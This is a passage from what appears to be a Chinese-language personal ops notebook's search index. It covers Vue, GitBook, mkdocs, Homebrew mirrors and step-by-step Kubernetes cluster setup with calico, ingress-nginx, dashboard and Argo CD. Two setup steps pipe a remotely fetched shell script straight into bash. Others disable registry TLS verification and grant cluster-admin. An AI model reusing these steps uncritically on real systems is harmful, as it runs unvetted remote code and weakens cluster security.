\u81ea\u5b9a\u4e49\u63a5\u53e3","text":"<pre><code>show create table casbin_rule\\G;\nINSERT INTO casbin_rule (ptype, v0, v1, v2, v3, v4, v5, v6, v7) VALUES ('p', '999', '/tbDemo/getABC', 'GET', '', '', '', '', '');\nselect * from casbin_rule;\n</code></pre>"},{"location":"dev/70-admin/#22-gin-admin","title":"2.2 gin-admin","text":"<p>Reference</p> <pre><code># \u4f1a\u81ea\u52a8migrate\n  `xx_id` bigint NOT NULL AUTO_INCREMENT,\n  `xx_name` varchar(255) DEFAULT NULL,\n\n  `created_at` datetime(3) DEFAULT NULL COMMENT '\u521b\u5efa\u65f6\u95f4',\n  `updated_at` datetime(3) DEFAULT NULL COMMENT '\u6700\u540e\u66f4\u65b0\u65f6\u95f4',\n  `deleted_at` datetime(3) DEFAULT NULL COMMENT '\u5220\u9664\u65f6\u95f4',\n  `create_by` bigint DEFAULT NULL COMMENT '\u521b\u5efa\u8005',\n  `update_by` bigint DEFAULT NULL COMMENT '\u66f4\u65b0\u8005',  \n</code></pre>"},{"location":"dev/80-html/","title":"html","text":""},{"location":"dev/80-html/#meta","title":"meta","text":"<p>\u9875\u9762\u8df3\u8f6c</p> <pre><code>&lt;meta http-equiv=\"refresh\" content=\"0; url=https://www.8ops.top/\" /&gt;\n</code></pre>"},{"location":"dev/81-vue/","title":"vue","text":"<p>\u524d\u63d0\u6761\u4ef6\uff1a\u5df2\u5b89\u88c5node\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528npm\u547d\u4ee4\uff0c\u5e76\u5168\u5c40\u5b89\u88c5vue-cli\u5de5\u5177\u3002 </p> <pre><code>npm install vue-cli -g\n</code></pre>"},{"location":"dev/81-vue/#_1","title":"\u521b\u5efa\u9879\u76ee","text":"<ul> <li>\u4f7f\u7528vue\u521d\u59cb\u5316\u57fa\u4e8ewebpack\u7684\u65b0\u9879\u76ee </li> </ul> <pre><code>vue init webpack my-project\n</code></pre> <p>\u200b      \u9879\u76ee\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4f1a\u63d0\u793a\u662f\u5426\u5b89\u88c5eslint\uff0c\u53ef\u4ee5\u9009\u62e9\u4e0d\u5b89\u88c5\uff0c\u5426\u5219\u9879\u76ee\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u5404\u79cd\u4ee3\u7801\u683c\u5f0f\u7684\u95ee\u9898\uff1b </p> <ul> <li>\u9879\u76ee\u521b\u5efa\u5b8c\u6210\u540e\uff0c\u5b89\u88c5\u57fa\u7840\u6a21\u5757 </li> </ul> <pre><code>cd myproject\nnpm install\n</code></pre> <p>\u200b      \u6a21\u5757\u5b89\u88c5\u65f6\u95f4\u6709\u53ef\u80fd\u4f1a\u5f88\u957f\uff0c\u4f9d\u8d56\u4e0e\u7f51\u901f\uff1b </p> <ul> <li>\u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u53ef\u5728\u5f00\u53d1\u6a21\u5f0f\u4e0b\u8fd0\u884c\u9879\u76ee\u5e76\u9884\u89c8\u9879\u76ee\u6548\u679c </li> </ul> <pre><code>npm run dev\n</code></pre> <ul> <li>\u5982\u679c\u9879\u76ee\u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\uff0c\u5373\u53ef\u7ee7\u7eed\u5b89\u88c5vue\u7684\u8f85\u52a9\u5de5\u5177 </li> </ul> <pre><code>npm install vue-router --save \uff08\u8def\u7531\u7ba1\u7406\u6a21\u5757\uff09\nnpm install vuex --save \uff08\u72b6\u6001\u7ba1\u7406\u6a21\u5757\uff09\nnpm install vue-resource --save \uff08\u7f51\u8def\u8bf7\u6c42\u6a21\u5757\uff09\n</code></pre>"},{"location":"dev/90-gitbook/","title":"gitbook","text":"<p>Reference</p>"},{"location":"dev/90-gitbook/#install","title":"install","text":"<pre><code>npm install gitbook-cli -g --registry=https://registry.npm.taobao.org\n</code></pre>"},{"location":"dev/90-gitbook/#build","title":"build","text":"<pre><code>gitbook init\ngitbook install\ngitbook build\n</code></pre>"},{"location":"dev/90-gitbook/#serve","title":"serve","text":"<pre><code>gitbook serve\n</code></pre>"},{"location":"dev/90-gitbook/#pdf","title":"pdf","text":"<pre><code>gitbook pdf\n</code></pre>"},{"location":"dev/91-docsify/","title":"docsify","text":"<p>Reference</p> <pre><code>~ $ docsify -h\nUsage: docsify &lt;init|serve&gt; &lt;path&gt;\n\nCommands:\n  docsify init [path]      Creates new docs                         [aliases: i]\n  docsify serve [path]     Run local server to preview site.        [aliases: s]\n  docsify start &lt;path&gt;     Server for SSR\n  docsify generate &lt;path&gt;  Docsify's generators                     [aliases: g]\n\nGlobal Options\n  --help, -h     Show help                                             [boolean]\n  --version, -v  Show version number                                   [boolean]\n\nDocumentation:\n  https://docsifyjs.github.io/docsify\n  https://docsifyjs.github.io/docsify-cli\n\nDevelopment:\n  https://github.com/docsifyjs/docsify-cli/blob/master/CONTRIBUTING.md\n</code></pre>"},{"location":"dev/92-mkdocs/","title":"mkdocs","text":"<p>Reference</p>"},{"location":"dev/92-mkdocs/#_1","title":"\u4e00\u3001 \u5b89\u88c5\u5411\u5bfc","text":"<pre><code>pip install mkdocs\n\nmkdocs new guide\ncd guide\nmkdocs serve\n\npip install mkdocs-material\npip install mkdocs-minify-plugin \n\nmkdocs gh-deploy --force\n</code></pre>"},{"location":"dev/92-mkdocs/#_2","title":"\u4e8c\u3001\u6dfb\u52a0\u8bc4\u8bba","text":"<p>\u8fd9\u91cc\u4f7f\u7528 Gitalk</p>"},{"location":"dev/92-mkdocs/#21-clientidclientsecret","title":"2.1 \u7533\u8bf7 ClientID+ClientSecret","text":"<p>Reference</p> <p></p>"},{"location":"dev/92-mkdocs/#22","title":"2.2 \u6dfb\u52a0\u6a21\u677f","text":"<p>vim mkdocs.yml</p> <pre><code>\u2026\u2026\ntheme:\n  name: material\n  custom_dir: templates\n\u2026\u2026\n</code></pre> <p>vim templates/main.html</p> <pre><code>{% extends \"base.html\" %}\n\n{% block content %}\n  {{ super() }}\n&lt;h2 id=\"__comments\"&gt;{{ lang.t(\"meta.comments\") }}&lt;/h2&gt;\n  &lt;link rel=\"stylesheet\" href=\"https://unpkg.com/gitalk/dist/gitalk.css\"&gt;\n  &lt;script src=\"https://unpkg.com/gitalk/dist/gitalk.min.js\"&gt;&lt;/script&gt;\n  &lt;div id=\"gitalk-container\"&gt;&lt;/div&gt;\n\n  &lt;script&gt;\nconst gitalk = new Gitalk({\n  clientID: 'xx',\n  clientSecret: 'xx',\n  repo: 'mkdocs',\n  owner: '8ops',\n  admin: ['xtso520ok'],\n  id: location.pathname,\n  distractionFreeMode: false\n})\n\ngitalk.render('gitalk-container')\n  &lt;/script&gt;\n{% endblock %}\n</code></pre>"},{"location":"dev/92-mkdocs/#_3","title":"\u4e09\u3001\u7f16\u8f91\u6548\u679c","text":"<p>Reference</p>"},{"location":"dev/92-mkdocs/#31","title":"3.1 \u5e38\u89c4\u6548\u679c","text":"<pre><code>- \u52a0\u7c97 **bold**\n- \u659c\u4f53\u5b57 *\u659c\u4f53\u5b57*\n- \u52a0\u7c97\u659c\u4f53 \u7c97\u659c\u4f53\n- \u4e0b\u5212\u7ebf ^^Insert me^^ OR abc\n- \u5220\u9664\u7ebf ~~Delete me~~\n- \u589e\u52a0 {++ add ++}\n- \u4fee\u6539 {~ is ~&gt; are ~}\n- \u5220\u9664 {\u2013 del \u2013}\n- \u9ad8\u4eae {== highlight ==}\n- \u6ce8\u91ca {&gt;&gt; comment &lt;&lt;}\n- \u4e0a\u6807 H^2^O, text^a\\ superscript^\n- \u4e0b\u6807 CH3CH2OH, texta\\ subscript\n- \u884c\u5185\u4ee3\u7801\u9ad8\u4eae\uff1a:::java System.out.println(\"hello\"); or #!python println('hello')\n- \u952e\u76d8\u5feb\u6377\u952e\u6807\u7b7e\uff1a++ctrl+alt+f++\n</code></pre> <ul> <li>\u52a0\u7c97 bold</li> <li>\u659c\u4f53\u5b57 \u659c\u4f53\u5b57</li> <li>\u52a0\u7c97\u659c\u4f53 \u7c97\u659c\u4f53</li> <li>\u4e0b\u5212\u7ebf Insert me OR abc</li> <li>\u5220\u9664\u7ebf Delete me</li> <li>\u589e\u52a0  {++ add ++}</li> <li>\u4fee\u6539 {~ is ~&gt; are ~}</li> <li>\u5220\u9664 {\u2013 del \u2013}</li> <li>\u9ad8\u4eae {== highlight ==}</li> <li>\u6ce8\u91ca {&gt;&gt; comment &lt;&lt;}</li> <li>\u4e0a\u6807 H<sup>2</sup>O, text<sup>a superscript</sup></li> <li>\u4e0b\u6807 CH3CH2OH, texta subscript</li> <li>\u884c\u5185\u4ee3\u7801\u9ad8\u4eae\uff1a:::java System.out.println(\"hello\"); or #!python println('hello'):::</li> <li>\u952e\u76d8\u5feb\u6377\u952e\u6807\u7b7e\uff1aCtrl+Alt+F</li> </ul>"},{"location":"dev/92-mkdocs/#32","title":"3.2 \u590d\u9009\u6846","text":"<pre><code>- [x] a\n- [ ] b\n- [x] c\n</code></pre> <ul> <li> a</li> <li> b</li> <li> c</li> </ul>"},{"location":"dev/92-mkdocs/#33","title":"3.3 \u6570\u5b66\u516c\u5f0f","text":"<pre><code>$a^2$\n</code></pre> <p>\\(a^2\\)</p>"},{"location":"dev/92-mkdocs/#34","title":"3.4 \u7279\u522b\u63d0\u793a","text":"<pre><code># \u7279\u522b\u63d0\u793a\n!!! note \"custom title or blank\"\n    text\n\n# \u5176\u4ed6\u6548\u679c\n??? abstract \"\u6458\u8981\uff0c\u603b\u7ed3\" abstract, summary, tldr\n??? tip \"\u8d34\u58eb\uff0cTIP\" tip, hint, important\n??? note \"\u6ce8\u91ca\uff0c\u4ee3\u7801\u8bf4\u660e\" note, snippet, seealso\n??? example \"\u4e3e\u4f8b\uff0c\u5217\u8868\" example\n??? quote \"\u5f15\u7528\uff0c\u53c2\u8003\u94fe\u63a5\" quote, cite\n??? info \"\u63d0\u793a\uff0cTODO\" info, todo\n??? warning \"\u8b66\u544a\" warning, caution, attention\n??? danger \"\u5371\u9669\" danger, error\n??? success \"\u6210\u529f\uff0c\u52fe\u9009\uff0c\u5b8c\u6210\" success, check, done\n??? fail \"\u5931\u8d25\" failure, fail, missing\n??? faq \"\u95ee\u9898\uff0c\u7591\u95ee\uff0c\u5e2e\u52a9\" question, help, faq\n??? bug \"BUG\" bug    \n\n# \u53ef\u6298\u53e0\uff0c+\u9ed8\u8ba4\u6253\u5f00\n???+ danger highlight blink \"custom title or blank\"\n    text vtext text, text, v&lt;br&gt;\n    text vtext text, text, v\n    #```python\n    # text1 = \"Hello, \"\n    # text2 = \"world!\"\n    # print text1 + text2\n    #```\n</code></pre> <p>note - \u6ce8\u91ca\u8bf4\u660e\uff0c\u9ed8\u8ba4\u6253\u5f00</p> <p>text</p> note - \u6ce8\u91ca\u8bf4\u660e\uff0c\u9ed8\u8ba4\u5173\u95ed <p>text</p> abstract - \u6458\u8981\uff0c\u603b\u7ed3 <p>text</p> tip - \u8d34\u58eb\uff0cTIPS <p>text</p> example  - \u4e3e\u4f8b\uff0c\u5217\u8868 <p>text</p> quote  - \u5f15\u7528\uff0c\u53c2\u8003\u94fe\u63a5 <p>text</p> info  - \u63d0\u793a\uff0cTODO <p>text</p> warning  - \u8b66\u544a <p>text</p> danger  - \u5371\u9669 <p>text</p> success  - \u6210\u529f\uff0c\u52fe\u9009\uff0c\u5b8c\u6210 <p>text</p> fail  - \u5931\u8d25 <p>text</p> faq  - \u95ee\u9898\uff0c\u7591\u95ee\uff0c\u5e2e\u52a9 <p>text</p> bug  - BUG <p>text</p> \u53ef\u6298\u53e0\uff0c+\u9ed8\u8ba4\u6253\u5f00\uff0c-\u9ed8\u8ba4\u6298\u53e0 <p>A: text text text text  B: text text text text </p> <pre><code>text1 = \"Hello, \"\ntext2 = \"world!\"\nprint text1 + text2\n</code></pre>"},{"location":"dev/92-mkdocs/#35-tab","title":"3.5 \u6c34\u5e73TAB","text":"<pre><code>===  \"A\"\n    this is A\n\n===  \"B\"\n    this is B\n\n===  \"C\"\n    this is C\n</code></pre> ABC <p>this is A</p> <p>this is B</p> <p>this is C</p>"},{"location":"dev/96-macbook/","title":"MacBook","text":"<p>M2 Pro</p>"},{"location":"dev/96-macbook/#brew","title":"brew","text":"<pre><code>https://developer.aliyun.com/mirror/homebrew/\n\n    # \u66ff\u6362brew.git:\n    cd \"$(brew --repo)\"\n    git remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git\n    # \u66ff\u6362homebrew-core.git:\n    cd \"$(brew --repo)/Library/Taps/homebrew/homebrew-core\"\n    git remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git\n    # \u5e94\u7528\u751f\u6548\n    brew update\n    # \u66ff\u6362homebrew-bottles:\n    echo 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles' &gt;&gt; ~/.bash_profile\n    source ~/.bash_profile\n</code></pre>"},{"location":"dev/96-macbook/#xcode","title":"xcode","text":"<pre><code>sudo rm -rf /Library/Developer/CommandLineTools\nxcode-select --install\n/usr/bin/xcodebuild -version\n\nxcode-select -print-path\n# sudo xcode-select -s /Library/Developer/CommandLineTools\nsudo xcode-select -s /Applications/Xcode.app/Contents/Developer\n</code></pre>"},{"location":"dev/96-macbook/#hostname","title":"hostname","text":"<pre><code>sudo scutil --set HostName MacBook-Pro\n</code></pre>"},{"location":"dev/99-article/","title":"\u6587\u7ae0\u7ba1\u7406","text":"<p>\u4f7f\u7528 markdown \u7684\u65b9\u5f0f\u7f16\u5199\u6587\u7ae0\uff0c\u4e00\u5904\u7f16\u8f91\u591a\u5904\u53d1\u5e03\u3002</p> <p>https://books.8ops.top/</p>"},{"location":"dev/99-article/#_2","title":"\u6e20\u9053\u4e00\uff0c\u516c\u4f17\u53f7","text":"<p><code>\u8fd0\u7ef4\u867e</code></p> <p>\u7f8e\u5316</p> <ol> <li>\u7f8e\u5316\u7ad9\u70b9</li> <li>\u4ee3\u7801\u4e3b\u9898\uff1agithub</li> <li>\u4e00\u952e\u6392\u7248\uff1a\u6807\u9898\u5012\u6302</li> </ol> <p>\u53d1\u5e03</p> <ol> <li>\u62f7\u8d1d\u7f8e\u5316\u5185\u5bb9\u81f3\u516c\u4f17\u53f7\u540e\u53f0\u8349\u7a3f\u7bb1</li> <li>\u4e0a\u4f20\u56fe\u7247\u81f3\u7d20\u6750\u5e76\u4ece\u7d20\u6750\u5e93\u8865\u5168\u5185\u5bb9\u4e2d\u7f3a\u5931\u56fe\u7247</li> <li>\u5c01\u9762\u4e0e\u6458\u8981\uff1a\u5b9a\u5236\u5c01\u9762\uff0c\u6458\u8981\u4f1a\u9ed8\u8ba4\u4ece\u5185\u5bb9\u9996\u90e8\u622a\u53d6</li> <li>\u5f00\u542f\u539f\u521b\uff0c\u5f00\u542f\u8d5e\u8d4f\uff0c\u6587\u7ae0\u7c7b\u522b\uff08\u79d1\u6280/\u4fe1\u606f\u6280\u672f\uff09</li> <li>\u8bdd\u9898\u6807\u7b7e\uff1ahelm\u3001kubeadm\u3001kubernetes\u3001\u8fd0\u7ef4\u5b9e\u8df5\u5b9e\u5f55</li> </ol> <p>\u516c\u4f17\u53f7\u4e0d\u652f\u6301\u5916\u94fe\uff0c\u5728\u5fc5\u8981\u65f6\u660e\u6587\u66b4\u9732url</p>"},{"location":"dev/99-article/#_3","title":"\u6e20\u9053\u4e8c\uff0c\u77e5\u4e4e","text":"<p>https://www.zhihu.com/people/8ops</p> <p>\u53d1\u5e03</p> <ol> <li>\u76f4\u63a5markdown\u62f7\u8d1d</li> <li>\u901a\u8fc7\u4e0a\u4f20\u8865\u5168\u56fe\u7247</li> <li>\u9009\u62e9\u5b9a\u5236\u5c01\u9762\uff0c</li> <li>\u6587\u7ae0\u8bdd\u9898\uff1ahelm\u3001kubeadm\u3001kubernetes</li> </ol>"},{"location":"dev/99-article/#_4","title":"\u6e20\u9053\u4e09\u3001\u81ea\u6709\u7ad9\u70b9","text":"<p>https://docsify.8ops.top </p> <p>\u91c7\u7528docsify</p>"},{"location":"dev/99-article/#_5","title":"\u6e20\u9053\u56db\u3001\u81ea\u6709\u7ad9\u70b9","text":"<p>https://mkdocs.8ops.top</p> <p>\u91c7\u7528 mkdocs</p>"},{"location":"kubernetes/01-cluster-init-calico-1.31/","title":"Quick Start - Calico - v1.31.1","text":"<p>Init</p> <p>Upgrade</p>"},{"location":"kubernetes/01-cluster-init-calico-1.31/#_1","title":"\u4e00\u3001\u64cd\u4f5c\u96c6\u9526","text":""},{"location":"kubernetes/01-cluster-init-calico-1.31/#11-cluster","title":"1.1 cluster","text":"<pre><code># init\ncurl -s https://books.8ops.top/attachment/kubernetes/bin/01-init-v1.28.sh | bash\n\n# containerd\nsed -i 's#sandbox_image.*$#sandbox_image = \"hub.8ops.top/google_containers/pause:3.10\"#' /etc/containerd/config.toml  \nsed -i 's#SystemdCgroup = false#SystemdCgroup = true#' /etc/containerd/config.toml \ngrep -P 'sandbox_image|SystemdCgroup' /etc/containerd/config.toml  \nsystemctl restart containerd\nsystemctl status containerd\n\nsed -i '/.registry.mirrors/a \\        [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"hub.8ops.top\"]\\n          endpoint = [\"https://hub.8ops.top\"]' /etc/containerd/config.toml\nsed -i '/.registry.configs/a \\         [plugins.\"io.containerd.grpc.v1.cri\".registry.configs.\"hub.8ops.top\".tls]\\n          insecure_skip_verify = true ' /etc/containerd/config.toml\nsystemctl restart containerd\ncrictl pull hub.8ops.top/google_containers/pause:3.10\n\n# kubeadm\nkubeadm config images list \nkubeadm config images list --config kubeadm-init.yaml-v1.31.1\nkubeadm config images pull --config kubeadm-init.yaml-v1.31.1\n\nregistry.k8s.io/kube-apiserver:v1.31.1\nregistry.k8s.io/kube-controller-manager:v1.31.1\nregistry.k8s.io/kube-scheduler:v1.31.1\nregistry.k8s.io/kube-proxy:v1.31.1\nregistry.k8s.io/coredns/coredns:v1.11.3\nregistry.k8s.io/pause:3.10\nregistry.k8s.io/etcd:3.5.15-0\n\nhub.8ops.top/google_containers/kube-apiserver:v1.31.1\nhub.8ops.top/google_containers/kube-controller-manager:v1.31.1\nhub.8ops.top/google_containers/kube-scheduler:v1.31.1\nhub.8ops.top/google_containers/kube-proxy:v1.31.1\nhub.8ops.top/google_containers/coredns:v1.11.3\nhub.8ops.top/google_containers/pause:3.10\nhub.8ops.top/google_containers/etcd:3.5.15-0\n\nkubeadm init --config kubeadm-init.yaml-v1.31.1 --upload-certs\n\nkubeadm join 10.101.11.110:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:076a3d987ee738f335cc987732e9306b87e044b3cce8138705ceeccb698acce7 \\\n    --control-plane --certificate-key 735385a90b3b827dcaba8e5e623eb0937abc53e8c71a806470110aeddf86407d\n\nkubeadm join 10.101.11.110:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:076a3d987ee738f335cc987732e9306b87e044b3cce8138705ceeccb698acce7\n\n# cni's calico\n# The following namespaces cannot be used: [calico-system calico-apiserver tigera-system tigera-elasticsearch tigera-compliance tigera-intrusion-detection tigera-dpi tigera-eck-operator tigera-fluentd calico-system tigera-manager]\n# helm \u5b89\u88c5\u672a\u89e3\u51b3\u955c\u50cf\u79c1\u6709\u5316\nhelm repo add projectcalico https://projectcalico.docs.tigera.io/charts\nhelm repo update projectcalico\nhelm search repo tigera-operator\nhelm show values projectcalico/tigera-operator --version 3.28.2 &gt; calico.yaml-3.28.2-default\n\nhelm upgrade --install calico projectcalico/tigera-operator \\\n    -f calico.yaml-3.28.2 \\\n    -n kube-system \\\n    --create-namespace \\\n    --version v3.28.2 \\\n    --debug 2&gt;&amp;1 | tee calico.yaml-3.28.2.out\n\nhelm -n kube-system uninstall calico\n\ndocker.io/calico/cni:v3.28.2\ndocker.io/calico/csi:v3.28.2\ndocker.io/calico/kube-controllers:v3.28.2\ndocker.io/calico/node-driver-registrar:v3.28.2\ndocker.io/calico/node:v3.28.2\ndocker.io/calico/pod2daemon-flexvol:v3.28.2\ndocker.io/calico/typha:v3.28.2\n\nhub.8ops.top/google_containers/calico-typha:v3.28.2\nhub.8ops.top/google_containers/calico-node:v3.28.2\nhub.8ops.top/google_containers/calico-cni:v3.28.2\nhub.8ops.top/google_containers/calico-pod2daemon-flexvol:v3.28.2\nhub.8ops.top/google_containers/calico-csi:v3.28.2\nhub.8ops.top/google_containers/calico-node-driver-registrar:v3.28.2\nhub.8ops.top/google_containers/calico-kube-controllers:v3.28.2\n\n# raw OK\nwget https://raw.githubusercontent.com/projectcalico/calico/v3.28.2/manifests/calico.yaml\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico-1.31/#12-metallb","title":"1.2 metallb","text":"<pre><code># metallb\nhelm repo add metallb https://metallb.github.io/metallb\nhelm repo update metallb\nhelm search repo metallb\nhelm show values metallb/metallb --version 0.14.8 &gt; metallb.yaml-0.14.8-default\n\nhelm upgrade --install metallb metallb/metallb \\\n    -f metallb.yaml-0.14.8 \\\n    --namespace=kube-server \\\n    --create-namespace \\\n    --version 0.14.8 \\\n    --debug 2&gt;&amp;1 | tee metallb.yaml-0.14.8.out\n\nhelm -n kube-server uninstall metallb\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico-1.31/#13-ingress-nginx","title":"1.3 ingress-nginx","text":"<pre><code># ingress-nginx\nhelm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx\nhelm repo update ingress-nginx\nhelm search repo ingress-nginx\nhelm show values ingress-nginx/ingress-nginx --version 4.11.3 &gt; ingress-nginx.yaml-4.11.3-default\n\nhelm upgrade --install ingress-nginx-external-controller ingress-nginx/ingress-nginx \\\n    -f ingress-nginx.yaml-4.11.3 \\\n    -n kube-server \\\n    --version 4.11.3 \\\n    --debug 2&gt;&amp;1 | tee ingress-nginx.yaml-4.11.3.out\n\nhelm -n kube-server uninstall ingress-nginx-external-controller\n\nkubectl -n default create secret tls tls-8ops.top \\\n  --cert=8ops.top.crt \\\n   --key=8ops.top.key\n\ncurl -k -vv --tlsv1.1 --tls-max 1.2  https://echoserver.8ops.top\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico-1.31/#14-dashboard","title":"1.4 dashboard","text":"<pre><code># dashboard\nhelm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/\nhelm repo update kubernetes-dashboard\nhelm search repo kubernetes-dashboard\nhelm show values kubernetes-dashboard/kubernetes-dashboard --version 7.8.0 &gt; kubernetes-dashboard.yaml-7.8.0-default\n\nhelm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard \\\n    -f kubernetes-dashboard.yaml-7.8.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 7.8.0 \\\n    --debug 2&gt;&amp;1 | tee kubernetes-dashboard.yaml-7.8.0.out\n\nkubectl -n kube-server create secret tls tls-8ops.top \\\n  --cert=8ops.top.crt \\\n   --key=8ops.top.key\n\nkubectl create serviceaccount dashboard-ops -n kube-server\n\nkubectl create clusterrolebinding dashboard-ops \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=kube-server:dashboard-ops\n\nkubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: Secret\nmetadata:\n  name: dashboard-ops-secret\n  namespace: kube-server\n  annotations:\n    kubernetes.io/service-account.name: dashboard-ops\ntype: kubernetes.io/service-account-token\nEOF\n\nkubectl describe secrets \\\n  -n kube-server $(kubectl -n kube-server get secret | awk '/dashboard-ops/{print $1}')\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico-1.31/#15-argo","title":"1.5 argo","text":"<pre><code>helm repo add argoproj https://argoproj.github.io/argo-helm\nhelm repo update argoproj\nhelm search repo argo-cd\nhelm show values argoproj/argo-cd --version 7.6.8 &gt; argo-cd.yaml-7.6.8-default\n\nhelm upgrade --install argo-cd argoproj/argo-cd \\\n    -n kube-server \\\n    -f argo-cd.yaml-7.6.8 \\\n    --version 7.6.8 \\\n    --debug 2&gt;&amp;1 | tee argo-cd.yaml-7.6.8.out\n\nhelm -n kube-server uninstall argo-cd\n\nkubectl -n kube-server get secret argocd-initial-admin-secret \\\n    -o jsonpath=\"{.data.password}\" | base64 -D; echo \n\n# account    \nargocd login argo-cd.8ops.top --username=admin --password=xx --grpc-web\nargocd account update-password --account jesse --current-password xx --new-password xx --grpc-web\n\n# proj\nargocd proj create control-plane-ops --description \"control-plane for ops\" \nargocd proj add-source control-plane-ops \\\n    https://git.8ops.top/ops/control-plane-ops.git\nargocd proj add-destination control-plane-ops \\\n    https://kubernetes.default.svc default\nargocd proj add-destination control-plane-ops \\\n    https://kubernetes.default.svc kube-server\nargocd proj allow-cluster-resource control-plane-ops '*' '*' -l allow\nargocd proj allow-namespace-resource control-plane-ops '*' '*' -l allow\nargocd proj get control-plane-ops\nargocd proj list\n\n# repo\nargocd repo add https://git.8ops.top/ops/control-plane-ops.git \\\n    --name control-plane-ops \\\n    --project control-plane-ops \\\n    --username gitlab-read \\\n    --password xx \\\n    --insecure-skip-server-verification\nargocd repo get https://git.8ops.top/ops/control-plane-ops.git\nargocd repo list\n\n# app\nargocd app create toolkit \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path toolkit \\\n    --project control-plane-ops \\\n    --directory-recurse \\\n    --dest-namespace default \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico-1.31/#_2","title":"\u4e8c\u3001\u5e38\u89c1\u95ee\u9898","text":"<pre><code># 1, kube-proxy \u62a5\u9519 failed complete: unrecognized feature gate: SupportIPVSProxyMode\n\nkubectl -n kube-system edit cm kube-proxy\n# \u79fb\u9664\u914d\u7f6e \nfeatureGates:\n  SupportIPVSProxyMode: true\n\n# 2, \u66f4\u591a\u4f7f\u7528 \n# https://docs.projectcalico.org/manifests/calico.yaml\n# \u7f51\u7edc\u7b56\u7565\n# \u56fa\u5b9a IP\n# IP \u6c60\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico-1.31/#21-flannel-switch-calico","title":"2.1  flannel switch calico","text":"<pre><code># 1\u3001\u67e5\u770b\u5df2\u5b89\u88c5flannel\u4fe1\u606f\ncat /etc/cni/net.d/10-flannel.conflist\n\n# 2\u3001\u5220\u9664flannel\u5e03\u7f72\u8d44\u6e90\nkubectl delete -f kube-flannel.yml\n\n# 3\u3001\u6e05\u9664flannel\u9057\u7559\u4fe1\u606f\uff0c\u5728\u96c6\u7fa4\u5404\u8282\u70b9\u6e05\u7406flannel\u7f51\u7edc\u7684\u6b8b\u7559\u6587\u4ef6\nifconfig cni0 down\nip link delete cni0\nifconfig flannel.1 down\nip link delete flannel.1\nrm -rf /var/lib/cni\nrm -rf /etc/cni/net.d\n\n# 4\u3001\u5b89\u88c5 calico\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/","title":"Quick Start - Calico","text":"<p>Reference</p> <p>\u5f53\u524d\u5404\u8f6f\u4ef6\u7248\u672c</p> \u540d\u79f0 \u7248\u672c ubuntu v22.04 kubernetes v1.25.0 calico v3.24.1 <ul> <li>\u8fd9\u91cc\u64cd\u4f5c\u7cfb\u7edf\u9009\u62e9 <code>20.04</code></li> </ul>"},{"location":"kubernetes/01-cluster-init-calico/#_1","title":"\u4e00\u3001\u51c6\u5907\u8d44\u6e90","text":""},{"location":"kubernetes/01-cluster-init-calico/#11-vip","title":"1.1 VIP","text":"<p>\u901a\u8fc7 <code>haproxy</code> \u4ee3\u7406 <code>apiserver</code> \u591a\u8282\u70b9</p> <p>10.101.11.110</p>"},{"location":"kubernetes/01-cluster-init-calico/#12","title":"1.2 \u670d\u52a1\u5668","text":"\u89d2\u8272 \u670d\u52a1\u5668\u5730\u5740 control-plane 10.101.11.240 control-plane 10.101.11.114 control-plane 10.101.11.154 work-node 10.101.11.196 work-node 10.101.11.157 work-node 10.101.11.250"},{"location":"kubernetes/01-cluster-init-calico/#_2","title":"\u4e8c\u3001\u642d\u5efa\u96c6\u7fa4","text":"<p>Reference</p> <p>pull repo </p> <pre><code>{\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.25.0\":\"hub.8ops.top/google_containers/kube-apiserver\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager:v1.25.0\":\"hub.8ops.top/google_containers/kube-controller-manager\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler:v1.25.0\":\"hub.8ops.top/google_containers/kube-scheduler\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.25.0\":\"hub.8ops.top/google_containers/kube-proxy\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.8\":\"hub.8ops.top/google_containers/pause\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/etcd:3.5.4-0\":\"hub.8ops.top/google_containers/etcd\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:v1.9.3\":\"hub.8ops.top/google_containers/coredns\"\n}\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#21","title":"2.1 \u521d\u59cb\u5316\u73af\u5883","text":"<pre><code>curl -s https://books.8ops.top/attachment/kubernetes/bin/01-init.sh | bash\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#22-lib","title":"2.2 \u8c03\u6574lib\u76ee\u5f55","text":"<pre><code># containerd\nmkdir -p /data1/lib/containerd &amp;&amp; \\\n    ([ -e /var/lib/containerd ] &amp;&amp; mv /var/lib/containerd{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/containerd 